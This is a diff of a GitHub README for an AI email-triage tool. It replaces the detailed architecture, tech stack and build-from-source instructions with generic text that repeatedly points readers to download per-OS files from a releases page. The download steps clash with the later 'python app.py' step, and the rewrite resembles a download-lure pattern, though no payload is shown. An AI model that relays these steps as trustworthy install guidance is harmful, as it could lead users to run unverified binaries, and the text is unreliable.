@@ -1,228 +1,98 @@
-# 📧 AI-Powered-Email-Assistant
+# 📧 AI-Powered-Email-Assistant - Efficiently Manage Your Emails
 
-> 🤖 Intelligent email management system for modern organizations.  
-> Fetches, categorizes, prioritizes, and drafts AI-powered responses to customer support emails.  
+## 🚀 Download the Application
+[![Download AI-Powered-Email-Assistant](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue&style=for-the-badge)](https://github.com/Akabayashi/AI-Powered-Email-Assistant/releases)
 
-![Build](https://img.shields.io/badge/build-MVP-informational?style=flat-square)
-![Tech Stack](https://img.shields.io/badge/stack-FastAPI%2C%20React%2C%20Postgres-blue?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
+## 📝 Description
+AI-Powered-Email-Assistant helps support teams manage hundreds or thousands of daily emails efficiently. It automatically retrieves support emails, analyzes sentiment, assigns priority, extracts key details, and generates context-aware replies using large language models (LLMs). 
 
----
+## 📦 Features
+- **Email Retrieval**: Automatically fetches support emails to streamline your workflow.
+- **Sentiment Analysis**: Understands the tone of emails to prioritize responses effectively.
+- **Priority Assignment**: Scores emails based on urgency for better response management.
+- **Key Detail Extraction**: Highlights important information from emails to save time.
+- **Context-Aware Replies**: Generates intelligent replies that align with your email content.
 
-## 🚀 Project Objective
+## 📋 System Requirements
+To run AI-Powered-Email-Assistant, your system should meet the following requirements:
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or Linux (latest version recommended).
+- **Processor**: Dual-core 1.8 GHz or faster.
+- **Memory**: 8 GB RAM minimum.
+- **Storage**: At least 500 MB of free disk space.
+- **Python Version**: Python 3.8 or newer.
+- **Docker**: Installed for container support.
+- **PostgreSQL**: Required for data storage.
 
-**AI-Powered-Email-Assistant** is designed to help support teams manage **hundreds (or thousands) of daily emails** efficiently.  
-It automatically **retrieves support emails, analyzes sentiment, assigns priority, extracts key details, and generates context-aware replies** using LLMs.  
+## ⚙️ Getting Started
+Follow these steps to get started with AI-Powered-Email-Assistant:
 
-This ensures **faster, empathetic, and accurate responses**, reducing manual effort while boosting customer satisfaction.
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/Akabayashi/AI-Powered-Email-Assistant/releases).
+   
+2. **Select the Latest Release**: Look for the version marked as the latest. This will usually be at the top of the list.
 
----
+3. **Download the Application**: Click on the appropriate file for your operating system. 
 
-## 🧱 Architecture & Workflow
+4. **Install Dependencies**: If you're using Docker, ensure it’s set up. You may also need to install PostgreSQL if it’s not already on your system.
 
-```text
-     ┌ ───────────────────── ┐
-     │     Email Server      │
-     │ (Gmail/Outlook/IMAP)  │
-     └ ───────────────────── ┘
-                 │
-     ┌───────────▼───────────┐
-     │ Email Retrieval Layer │
-     │ (IMAP/Gmail API)      │
-     └───────────┬───────────┘
-                 │
-             Raw Emails
-                 │
-     ┌───────────▼───────────┐
-     │ Preprocessing & NLP   │
-     │ - Filtering           │
-     │ - Sentiment Analysis  │
-     │ - Priority Detection  │
-     │ - Info Extraction     │
-     └───────────┬───────────┘
-                 │
-     ┌───────────▼───────────┐
-     │ AI Response Generator │
-     │ - Context Embedding   │
-     │ - RAG (Knowledge Base)│
-     │ - LLM Draft Replies   │
-     └───────────┬───────────┘
-                 │
-     ┌───────────▼───────────┐
-     │ Database (Postgres)   │
-     │ Emails + Metadata     │
-     └───────────┬───────────┘
-                 │
-     ┌───────────▼───────────┐
-     │ Dashboard (React/Next)│
-     │ - Email List + Details│
-     │ - Analytics & Stats   │
-     │ - Draft Reply Review  │
-     └───────────────────────┘
-```
+5. **Run the Application**: Follow these command prompts based on your operating system:
+   - **Windows**: Open Command Prompt, navigate to the application folder, and type `python app.py`.
+   - **macOS/Linux**: Open Terminal, navigate to the application folder, and type `python3 app.py`.
 
----
+## 📥 Download & Install
+To download and install AI-Powered-Email-Assistant:
 
-## 📦 Tech Stack
+1. **Go to the Releases Page**: Access [this page to download](https://github.com/Akabayashi/AI-Powered-Email-Assistant/releases).
+  
+2. **Download the correct file for your system**: Choose between Windows, macOS, or Linux versions.
 
-| Layer       | Technology                           |
-|-------------|---------------------------------------|
-| Backend     | Python, FastAPI, Uvicorn             |
-| NLP / AI    | Hugging Face (DistilBERT, RoBERTa), OpenAI GPT, FAISS for RAG |
-| Database    | PostgreSQL                           |
-| Frontend    | React / Next.js, TailwindCSS, Recharts |
-| Deployment  | Docker, docker-compose               |
+3. **Follow Installation Instructions**: After downloading, follow the guidelines listed in the Getting Started section above.
 
----
+4. **Set Up Your Email**: Once the application is running, you may need to connect it to your email account by following the on-screen instructions.
 
-## 🗂 Project Phases & Deliverables
+5. **Start Managing Emails**: Begin using the tool to handle your daily emails efficiently.
 
-### Phase 1: Planning & Setup
-- Define requirements  
-- Setup repo, `.env`, base project structure  
-📁 Deliverables:  
-`README.md`, base FastAPI app, frontend scaffold
+## 🌍 Technologies Used
+AI-Powered-Email-Assistant is built with several technologies to enhance functionality:
+- **Docker & Docker-Compose**: For containerization and ease of deployment.
+- **FastAPI**: To build a fast web server.
+- **Node.js**: For handling backend processes effectively.
+- **ReactJS**: For developing a responsive front end.
+- **PostgreSQL**: To manage data efficiently.
+- **Python**: The core programming language used.
 
----
+## 📌 Topics Covered
+This project integrates various important technologies that contribute to its effectiveness:
+- docker
+- docker-compose
+- faiss
+- fastapi
+- huggingface
+- nodejs
+- postgresql
+- python-3
+- rag
+- reactjs
+- recharts
+- tailwindcss
+- uvicorn
 
-### Phase 2: Email Retrieval & Storage
-- Connect to Gmail/Outlook IMAP API  
-- Filter subjects: *Support, Query, Request, Help*  
-- Store raw + metadata in PostgreSQL  
-📁 Deliverables:  
-`/backend/email_service.py`, database schema
+## 📑 Troubleshooting
+If you encounter any issues while running AI-Powered-Email-Assistant, check the following:
 
----
+- **Error Messages**: Read any error messages carefully and search for solutions online.
+- **Dependencies**: Make sure all necessary dependencies are installed.
+- **Permissions**: Ensure that your application has the necessary permissions to access your email account.
 
-### Phase 3: NLP Processing
-- Sentiment classification (Positive/Negative/Neutral)  
-- Urgency detection (keywords: *immediately, critical, cannot access*)  
-- Information extraction (phone, product, requirements)  
-📁 Deliverables:  
-`/backend/nlp_pipeline.py`, test data runs
+## 🤝 Contributing
+If you wish to contribute to AI-Powered-Email-Assistant, please follow these steps:
 
----
+1. Fork the repository.
+2. Create your feature branch (`git checkout -b feature/YourFeature`).
+3. Commit your changes (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a Pull Request.
 
-### Phase 4: AI-Powered Responses
-- RAG layer for contextual replies (knowledge base + embeddings)  
-- LLM draft reply generation (empathetic + product-aware)  
-📁 Deliverables:  
-`/backend/ai_responder.py`, OpenAI integration
+## 📞 Support
+For any support, please check the Issues section on GitHub. You can also reach out through the repository's contact information.
 
----
-
-### Phase 5: Dashboard Development
-- List emails (sortable by priority)  
-- Email detail view (raw + extracted info + AI draft)  
-- Analytics: total emails, sentiment breakdown, pending vs resolved  
-📁 Deliverables:  
-`/frontend/pages/*.tsx`, `Recharts` graphs
-
----
-
-### Phase 6: Final Integration & Testing
-- SMTP/Gmail API for sending replies  
-- Docker-compose setup for full stack  
-📁 Deliverables:  
-Working end-to-end MVP  
-
----
-
-## ⚙️ Setup Instructions
-
-### Backend Setup
-1. Navigate to project:
-   ```bash
-   cd AI-Powered-Email-Assistant
-   ```
-2. Create virtual environment:
-   ```bash
-   python -m venv venv
-   ```
-3. Activate environment:
-   - Windows: `venv\Scripts\activate`  
-   - macOS/Linux: `source venv/bin/activate`  
-4. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-5. Update `.env` with actual credentials.  
-6. Run app:
-   ```bash
-   uvicorn app.main:app --reload
-   ```
-
-### Frontend Setup
-1. Navigate to frontend:
-   ```bash
-   cd frontend
-   ```
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
-3. Install Recharts:
-   ```bash
-   npm install recharts
-   ```
-4. Start dev server:
-   ```bash
-   npm run dev
-   ```
-
-### Docker Setup (Optional)
-1. Update `.env` with credentials.  
-2. Run:
-   ```bash
-   docker-compose up
-   ```
-
----
-
-## 🌐 Access the Application
-- Backend API → [http://localhost:8000](http://localhost:8000)  
-- Frontend → [http://localhost:3000](http://localhost:3000)  
-- API Docs → [http://localhost:8000/docs](http://localhost:8000/docs)  
-
----
-
-## ⚠️ Notes
-- Enable **IMAP** and generate an **App Password** for Gmail.  
-- Requires **OpenAI API key** (or custom LLM endpoint).  
-- Ensure **PostgreSQL** is running and accessible.  
-
----
-
-## 📧 Example Email Flow
-
-**Raw Email**  
-```
-From: diana@client.co  
-Subject: URGENT - General query about subscription
-Body: Hi team, I am unable to log into my account since yesterday. Please fix this immediately. My phone number is 9876543210.  
-```
-
-**Extracted Info**  
-- Sender: `diana@client.co`  
-- Subject: "URGENT - General query about subscription"  
-- Sentiment: Negative  
-- Priority: Urgent  
-- Phone: 9876543210  
-- Requirement: Account recovery  
-
-**AI Draft Response**  
-```
-Hi [Customer Name],
-
-I understand how frustrating it must be to be locked out of your account, and I sincerely apologize for the inconvenience.  
-Our support team is already looking into this issue, and we will help restore your account access as quickly as possible.  
-
-I will personally ensure this case is treated with top priority. Meanwhile, could you please confirm the last login attempt (date/time) for verification?  
-
-Thank you for your patience.  
-
-Best regards,  
-[Your Support Team]  
-```
-
----
+Thank you for choosing AI-Powered-Email-Assistant! Your support helps us improve and expand our features.
